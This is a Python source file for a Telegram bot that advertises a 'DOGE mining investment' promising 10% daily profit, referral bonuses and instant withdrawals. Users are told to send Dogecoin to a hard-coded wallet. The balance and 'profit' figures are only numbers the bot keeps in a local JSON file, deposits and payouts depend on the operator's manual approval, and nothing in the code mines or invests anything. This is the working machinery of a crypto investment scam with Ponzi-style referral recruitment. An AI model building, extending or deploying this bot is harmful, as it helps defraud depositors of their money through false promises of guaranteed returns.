import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import json, os
TOKEN = os.environ.get("TOKEN")
ADMIN_ID = 8938541719
YOUR_WALLET = "D9CyxEDc8aEvrhu4HDCTfwz33vL6YtpcYX"
MIN_DOGE = 100
DAILY_RATE = 0.10 # 10%

USERS_FILE = "users.json"

logging.basicConfig(level=logging.INFO)

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f)

def get_profit(invested, hours):
    return invested * DAILY_RATE * (hours / 24)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_users()
    if user_id not in users:
        users[user_id] = {"invested": 0, "profit": 0, "wallet": "", "joined": str(datetime.now()), "referrals": 0}
        # referral check
        if context.args and context.args[0]!= user_id:
            ref = context.args[0]
            if ref in users:
                users[ref]["referrals"] += 1
                users[ref]["profit"] += MIN_DOGE * 0.10 # 10% ref bonus
        save_users(users)

    keyboard = [
        [InlineKeyboardButton("💰 Deposit $10", callback_data="deposit"),
         InlineKeyboardButton("📊 Balance", callback_data="balance")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw"),
         InlineKeyboardButton("👥 Referral 10%", callback_data="referral")]
    ]
    text = f"""🚀 DOGE MINING INVESTMENT 🚀
━━━━━━━━━━━━━━━
📈 Profit: 10% Daily
💵 Min: $10 (100 DOGE)
👥 Referral: 10%
⚡ Withdrawal: Instant

📊 Example: Invest 100 DOGE → Earn 10 DOGE Daily

Your ID: `{user_id}`
"""
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    users = load_users()
    if user_id not in users:
        users[user_id] = {"invested": 0, "profit": 0, "wallet": "", "joined": str(datetime.now()), "referrals": 0}

    if query.data == "deposit":
        await query.message.reply_text(f"""💰 DEPOSIT INSTRUCTIONS

Send at least 100 DOGE to:

`{YOUR_WALLET}`

Network: DOGECOIN only!

After sending, send command:
/deposit TXID

Example:
/deposit abc123txidhere

Admin will approve in 5 mins. Contact @cityhyena""", parse_mode='Markdown')

    elif query.data == "balance":
        invested = users[user_id].get("invested", 0)
        profit = users[user_id].get("profit", 0)
        referrals = users[user_id].get("referrals", 0)
        await query.message.reply_text(f"""📊 YOUR BALANCE

💼 Invested: {invested} DOGE
💰 Profit: {profit:.2f} DOGE
👥 Referrals: {referrals}
📈 Daily Rate: 10%

Keep mining! 🚀""")

    elif query.data == "withdraw":
        await query.message.reply_text(f"""💸 WITHDRAWAL

Your profit: {users[user_id].get('profit',0):.2f} DOGE

To withdraw, send:
/withdraw YOUR_DOGE_WALLET AMOUNT

Example:
/withdraw DYourWalletHere 50

Min withdraw: 20 DOGE
Contact: @cityhyena""")

    elif query.data == "referral":
        bot_username = (await context.bot.get_me()).username
        link = f"https://t.me/{bot_username}?start={user_id}"
        await query.message.reply_text(f"""👥 REFERRAL PROGRAM - 10%

Your link:
{link}

Earn 10% from each friend's deposit instantly!

Referrals: {users[user_id].get('referrals',0)}""")

async def deposit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /deposit TXID\nAfter you send DOGE, paste transaction ID")
        return
    txid = context.args[0]
    user_id = str(update.effective_user.id)
    await update.message.reply_text(f"✅ TXID received: {txid}\nAdmin will verify and approve. Contact @cityhyena")
    # Notify admin
    try:
        await context.bot.send_message(ADMIN_ID, f"💰 NEW DEPOSIT REQUEST\nUser: {user_id} (@{update.effective_user.username})\nTXID: {txid}\nApprove: /approve {user_id} 100")
    except:
        pass

async def withdraw_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /withdraw DOGE_WALLET AMOUNT\nExample: /withdraw Dxxx 50")
        return
    wallet = context.args[0]
    try:
        amount = float(context.args[1])
    except:
        await update.message.reply_text("Invalid amount")
        return
    user_id = str(update.effective_user.id)
    users = load_users()
    if users.get(user_id, {}).get("profit",0) < amount:
        await update.message.reply_text(f"❌ Insufficient profit. Your profit: {users.get(user_id,{}).get('profit',0)} DOGE")
        return
    users[user_id]["wallet"] = wallet
    save_users(users)
    await update.message.reply_text(f"✅ Withdraw request: {amount} DOGE to {wallet}\nAdmin will pay shortly. @cityhyena")
    try:
        await context.bot.send_message(ADMIN_ID, f"💸 WITHDRAW REQUEST\nUser: {user_id} (@{update.effective_user.username})\nAmount: {amount} DOGE\nWallet: {wallet}\nPay then: /pay {user_id} {amount}")
    except:
        pass

async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    users = load_users()
    d = users.get(user_id, {"invested":0,"profit":0,"referrals":0})
    await update.message.reply_text(f"📊 Balance: Invested {d['invested']} DOGE | Profit {d['profit']:.2f} DOGE | Refs {d['referrals']}")

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id!= ADMIN_ID:
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /approve USERID AMOUNT")
        return
    uid, amt = context.args[0], float(context.args[1])
    users = load_users()
    if uid not in users:
        users[uid] = {"invested":0,"profit":0,"wallet":"","joined":str(datetime.now()),"referrals":0}
    users[uid]["invested"] += amt
    users[uid]["profit"] += amt * 0.10 # instant first day bonus for test
    save_users(users)
    await update.message.reply_text(f"✅ Approved {amt} DOGE for {uid}")
    try:
        await context.bot.send_message(int(uid), f"✅ Deposit approved! {amt} DOGE added. You now earn 10% daily! Check /balance")
    except:
        pass

async def pay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id!= ADMIN_ID:
        return
    if len(context.args) < 2:
        return
    uid, amt = context.args[0], float(context.args[1])
    users = load_users()
    if uid in users:
        users[uid]["profit"] -= amt
        if users[uid]["profit"] < 0: users[uid]["profit"] = 0
        save_users(users)
    await update.message.reply_text(f"✅ Marked as paid {amt} for {uid}")

app = ApplicationBuilder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("balance", balance_cmd))
app.add_handler(CommandHandler("deposit", deposit_cmd))
app.add_handler(CommandHandler("withdraw", withdraw_cmd))
app.add_handler(CommandHandler("invest", start))
app.add_handler(CommandHandler("approve", approve_cmd))
app.add_handler(CommandHandler("pay", pay_cmd))
app.add_handler(CallbackQueryHandler(button_handler))

app.run_polling()
